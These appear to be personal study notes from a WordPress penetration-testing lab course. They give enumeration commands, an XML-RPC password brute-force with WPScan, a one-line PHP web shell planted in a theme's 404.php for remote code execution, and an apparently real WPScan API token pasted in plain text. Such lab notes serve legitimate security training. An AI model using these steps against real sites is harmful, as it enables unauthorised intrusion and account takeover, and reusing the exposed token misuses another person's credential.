## Default WordPress File Structure

WordPress can be installed on a Windows, Linux, or Mac OSX host. For this module, we will focus on a default WordPress installation on an Ubuntu Linux web server. WordPress requires a fully installed and configured LAMP stack (Linux operating system, Apache HTTP Server, MySQL database, and the PHP programming language) before installation on a Linux host. After installation, all WordPress supporting files and directories will be accessible in the webroot located at `/var/www/html`.

![[Pasted image 20250623181121.png]]

## WP Version - Source Code 
To get the Source Version Code, we use the command : `curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'`

To check for the Version Number for Plugins : `curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2`

To check for the Version Number for Themes : `curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2`

To perform Plugins Active Enumeration : `curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta`

## Directory Indexing
```shell-session
curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```
Here html2text is the tool that converts HTML output to a nice readable format.

## User Enumeration
1. Check for the blogs or posts, where we could get parameters like ID, Usernames etc, so that we could enumerate them and check for other users too. The website URL would look like this : `http://blog.inlanefreight.com/?author=1`

2. The second method requires interaction with the `JSON` endpoint, which allows us to obtain a list of users. This was changed in WordPress core after version 4.7.1, and later versions only show whether a user is configured or not. Before this release, all users who had published a post were shown by default.
	**JSON Endpoint** : `curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq`


## Login
Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the `xmlrpc.php` page.

To find Method Calls Available, we can use the command : `curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://94.237.59.174:31080/xmlrpc.php`

## WPScan Enumeration
The command to use the WPScan Enumeration : `wpscan --url http://ip:port --enumerate --api-token <api-token>`

API Token for WpScan : 4c8SSanMPgBTRC2hU15g5yFYmQOtzeFqKJECshNg4OU

## Attacking WP Users
### Bruteforce - XMLRPC
The command to use is : `wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com`

### RCE
To use the command : `curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"`

# Remote Code Execution (RCE) via the Theme Editor

## Attacking the WordPress Backend

With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on `Appearance` on the side panel and select `Theme Editor`. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.

#### Theme Editor

![WordPress theme editor showing Transportex stylesheet with theme details and code.](https://academy.hackthebox.com/storage/modules/17/Theme-Editor.png)

We can see that the active theme is `Transportex` so an unused theme such as `Twenty Seventeen` should be chosen instead.

#### Selecting Theme

![WordPress theme editor showing Twenty Seventeen stylesheet with theme details and code.](https://academy.hackthebox.com/storage/modules/17/Twenty-Seventeen.png)

Choose a theme and click on `Select`. Next, choose a non-critical file such as `404.php` to modify and add a web shell.

#### Twenty Seventeen Theme - 404.php

Code: php

```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

The above code should allow us to execute commands via the GET parameter `cmd`. In this example, we modified the source code of the `404.php` page and added a new function called `system()`. This function will allow us to directly execute operating system commands by sending a GET request and appending the `cmd` parameter to the end of the URL after a question mark `?` and specifying an operating system command. The modified URL should look like this `404.php?cmd=id`.

We can validate that we have achieved RCE by entering the URL into the web browser or issuing the `cURL` request below.

#### RCE

  Remote Code Execution (RCE) via the Theme Editor

```shell-session
ShibuShivansh@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

## Attacking Wordpress with Metasploit
Use `msfconsole` and then `search wp_admin` and use that exploit, by providing the necessary options to run the exploit.
![[Pasted image 20250624012201.png]]

